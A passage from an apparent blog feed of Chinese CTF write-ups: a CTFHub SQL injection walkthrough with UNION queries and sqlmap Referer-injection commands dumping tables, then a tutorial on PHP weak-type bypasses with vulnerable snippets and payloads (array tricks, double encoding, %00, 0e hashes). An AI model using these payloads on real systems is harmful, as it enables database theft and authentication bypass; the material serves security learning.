class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span></span><br></pre></td></tr></table></figure><p>有两个表， news,scghlrqxyi<br><img src="https://img-blog.csdnimg.cn/20210127162506792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>3.爆字段名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;scghlrqxyi&#x27;</span></span><br></pre></td></tr></table></figure><p>字段名为vzbmlruwwt<br><img src="https://img-blog.csdnimg.cn/20210127162548886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>4.爆值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(vzbmlruwwt) <span class="keyword">from</span> scghlrqxyi</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127162635557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>sqlmap–Refer注入</strong></p><blockquote><p>伪造http请求中的referer，level&gt;=3时，sqlmap尝试referer注入</p></blockquote><p>首先检测是否有Refer注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://challenge-c221df8b5041fd8a.sandbox.ctfhub.com:10080/&quot; <span class="comment">--referer &quot;id=1&quot; --level 3</span></span><br></pre></td></tr></table></figure><p>Referer头存在注入<br><img src="https://img-blog.csdnimg.cn/20210127164244547.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>1.爆数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://challenge-c221df8b5041fd8a.sandbox.ctfhub.com:10080/&quot; <span class="comment">--referer &quot;id=1&quot; --level 3 --dbs</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127164340575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2.爆表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://challenge-c221df8b5041fd8a.sandbox.ctfhub.com:10080/&quot; <span class="comment">--referer &quot;id=1&quot; --level 3 -D sqli --tables</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127164517402.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>3.爆字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://challenge-c221df8b5041fd8a.sandbox.ctfhub.com:10080/&quot; <span class="comment">--referer &quot;id=1&quot; --level 3 -D sqli -T scghlrqxyi --columns</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127164603239.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>4.爆值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://challenge-c221df8b5041fd8a.sandbox.ctfhub.com:10080/&quot; <span class="comment">--referer &quot;id=1&quot; --level 3 -D sqli -T scghlrqxyi -C vzbmlruwwt --dump</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127164810825.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：CTFHub靶场通关（二）&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    <category term="WEB" scheme="https://swhat.github.io/categories/CTF/WEB/"/>
    
    
    <category term="CTFhub" scheme="https://swhat.github.io/tags/CTFhub/"/>
    
    <category term="SQL注入" scheme="https://swhat.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>代码审计之弱类型绕过</title>
    <link href="https://swhat.github.io/2020/11/04/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%BC%B1%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87/"/>
    <id>https://swhat.github.io/2020/11/04/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%BC%B1%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87/</id>
    <published>2020-11-04T07:48:04.000Z</published>
    <updated>2021-03-27T03:44:30.948Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：PHP弱类型绕过方法</p> <a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>之前做过没有总结，这几天做题经常遇见弱类型绕过，写篇博客总结一下(水一篇)，嘻嘻。</p></blockquote><p>提到php代码绕过，必然会提起<code>比较操作符</code>,下面来谈一谈比较操作符<code>==</code>与<code>===</code>，这两种都可以比较两个数字的大小，但是有很明显的区别。</p><table><thead><tr><th>操作符</th><th>描述</th></tr></thead><tbody><tr><td>==</td><td>把两端变量类型转换成相同的，再进行比较</td></tr><tr><td>===</td><td>先判断两端变量类型是否相同，再进行比较</td></tr></tbody></table><p><strong>注意</strong>：在两个相等的符号中，一个字符串与一个数字相比较时，字符串会转换成数值。</p><h2 id="1-extract变量覆盖"><a href="#1-extract变量覆盖" class="headerlink" title="1.extract变量覆盖"></a>1.extract变量覆盖</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line">extract(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$shiyan</span>)) &#123;</span><br><span class="line"><span class="variable">$content</span>=trim(file_get_contents(<span class="variable">$flag</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$shiyan</span>==<span class="variable">$content</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">&#x27;flag&#123;xxx&#125;&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">&#x27;Oh.no&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>extract()</td><td>函数从数组中将变量导入到当前的符号表</td></tr></tbody></table><p>在第三行, 运用了extract()函数, 将GET方式获得的变量导入到当前的符号表中,然后判断$ flag和$ shiyan两个变量的内容是否相等。</p><p>extract()函数导致这段代码存在一个变量覆盖漏洞,构造Payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload:?flag=&amp;shiyan=</span><br></pre></td></tr></table></figure><p> $ flag和$ shiyan这两个变量的内容都会被设置成空字符串。这样,就满足$shiyan == $content的条件，输出flag。<br><img src="https://img-blog.csdnimg.cn/20200425110348780.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="2-strcmp比较字符串"><a href="#2-strcmp比较字符串" class="headerlink" title="2.strcmp比较字符串"></a>2.strcmp比较字符串</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;xxxxx&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (strcmp(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>], <span class="variable">$flag</span>) == <span class="number">0</span>) <span class="comment">//如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span></span><br><span class="line"><span class="comment">//比较两个字符串（区分大小写）</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>); </span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;No&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>函数</th><th>用法</th><th>返回值</th></tr></thead><tbody><tr><td>strcmp()</td><td>strcmp(string1,string2)</td><td>若返回0,代表两个字符串相等 ；若返回&lt;0 ,代表string1 小于 string2；若返回&gt;0，代表string1 大于 string2</td></tr></tbody></table><p>对于传入非字符串类型的数据的时候，strcmp函数会报错，将return 0 ，但却判定其相等了。<br> 所以，strcmp()在比较字符串和数组的时候直接返回0，这样通过把目标变量设置成数组就可以绕过该函数的限制。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload:?a[]=<span class="number">123</span> </span><br></pre></td></tr></table></figure><p> <img src="https://img-blog.csdnimg.cn/20200425113316110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="3-urldecode二次编码绕过"><a href="#3-urldecode二次编码绕过" class="headerlink" title="3.urldecode二次编码绕过"></a>3.urldecode二次编码绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(eregi(<span class="string">&quot;hackerDJ&quot;</span>,<span class="variable">$_GET</span>[id])) &#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_GET</span>[id] = urldecode(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;hackerDJ&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Access granted!&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>urldecode()</td><td>解码已编码的 URL 字符串</td></tr></tbody></table><p>使用GET传参时，浏览器就已经把hakerDJ进行了一次解码了，然后又用了urldecode函数又再次进行了一次解码。所以我们要将hakerDJ进行二次编码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?id=%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">42</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">34</span>%<span class="number">41</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201031180041123.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="4-md5-函数"><a href="#4-md5-函数" class="headerlink" title="4.md5()函数"></a>4.md5()函数</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag&#123;test&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])</span><br><span class="line">      <span class="keyword">print</span> <span class="string">&#x27;Your password can not be your username.&#x27;</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (md5(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) === md5(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">print</span> <span class="string">&#x27;Invalid password&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><table><thead><tr><th></th><th>描述</th></tr></thead><tbody><tr><td>md5()</td><td>函数计算字符串的 MD5 散列</td></tr><tr><td>==</td><td>只需要等号两边的值是否相等。比如‘1’==1就成立，返回true</td></tr><tr><td>===</td><td>需要全等号两边的值和类型全都相等才成立</td></tr></tbody></table><p>md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload:?username[]=<span class="number">1</span>&amp;password[]=<span class="number">2</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200425115133708.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="5-数组返回NULL绕过"><a href="#5-数组返回NULL绕过" class="headerlink" title="5.数组返回NULL绕过"></a>5.数组返回NULL绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">&quot;^[a-zA-Z0-9]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) === <span class="literal">FALSE</span>)</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;You password must be alphanumeric&#x27;</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (strpos (<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>], <span class="string">&#x27;--&#x27;</span>) !== <span class="literal">FALSE</span>)</span><br><span class="line">     <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span> . <span class="variable">$flag</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;Invalid password&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>ereg</td><td>函数搜索由指定的字符串作为由模式指定的字符串，如果发现模式则返回true，否则返回false</td></tr><tr><td>strpos</td><td>函数查找字符串在另一字符串中第一次出现的位置。</td></tr></tbody></table><p>第4行代码，ereg函数会对传入的password从<code>a-z,A-Z,0-9</code> 进行匹配，将你的密码限制在这三种字符中。</p><p><strong>方法一</strong>：<br><code>strpos()</code>需要匹配到<code>--</code>才能输出flag，所以我们需要绕过<code>strpos()</code>函数。<code>strpos()</code>如果传入数组，会返回NULL。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?password[]=<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201031185451492.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><strong>方法二</strong>：</p><p>搜索字母的字符是大小写敏感的, 我们可以用%00来截断，在%00之后的数值函数无法识别</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?password=<span class="number">1</span>%<span class="number">00</span>--</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201031185650537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="6-弱类型整数大小比较绕过"><a href="#6-弱类型整数大小比较绕过" class="headerlink" title="6. 弱类型整数大小比较绕过"></a>6. 弱类型整数大小比较绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$temp</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">is_numeric(<span class="variable">$temp</span>)?<span class="keyword">die</span>(<span class="string">&quot;no numeric&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$temp</span>&gt;<span class="number">1336</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>is_numeric()</td><td>判断变量是否为数字或数字字符串</td></tr></tbody></table><p>传入的值会被is_numeric函数进行检测，如果为数字就直接输出no numeric，传参<code>password=2000a</code>既不是一个数字又大于1336,返回NULL，可以绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?password=<span class="number">2000</span>a</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201031192339220.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="7-sha-函数比较绕过"><a href="#7-sha-函数比较绕过" class="headerlink" title="7. sha()函数比较绕过"></a>7. sha()函数比较绕过</h2><p><a href="http://123.206.87.240:9009/7.php">http://123.206.87.240:9009/7.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">var_dump(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;  &quot;</span>;</span><br><span class="line">var_dump(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">var_dump(sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line">var_dump(sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]));</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your password can not be your name!&#x27;</span>; </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) === sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>); <span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Invalid password.&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Login first!&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>sha1()函数无法处理数组类型，通过构造数组，将报错并返回false，使条件成立，这样就绕过了sha1()函数，获得flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?name[]=<span class="number">1</span>&amp;password[]=<span class="number">2</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201031215444337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="8-md5加密相等绕过"><a href="#8-md5加密相等绕过" class="headerlink" title="8. md5加密相等绕过"></a>8. md5加密相等绕过</h2><p><a href="http://123.206.87.240:9009/13.php">http://123.206.87.240:9009/13.php</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$md51 = md5(&#x27;QNKCDZO&#x27;);</span><br><span class="line">$a = @$_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$md52 = @md5($a);</span><br><span class="line"><span class="keyword">if</span>(isset($a)) &#123;</span><br><span class="line">if ($a != &#x27;QNKCDZO&#x27; &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line">echo <span class="string">&quot;flag&#123;*&#125;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">echo <span class="string">&quot;false!!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">echo <span class="string">&quot;please input a&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>字符串QNKCDZO被md5加密后之后是前两位为<code>0e</code>，然后我们找一个字符串的md5之后的结果也为e0xxx的就可以绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?a=s878926199a</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201103191138163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>原理：</p><blockquote><p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，</p><p>所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p></blockquote><p>以下字符串，md5哈希值都是0e开头的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 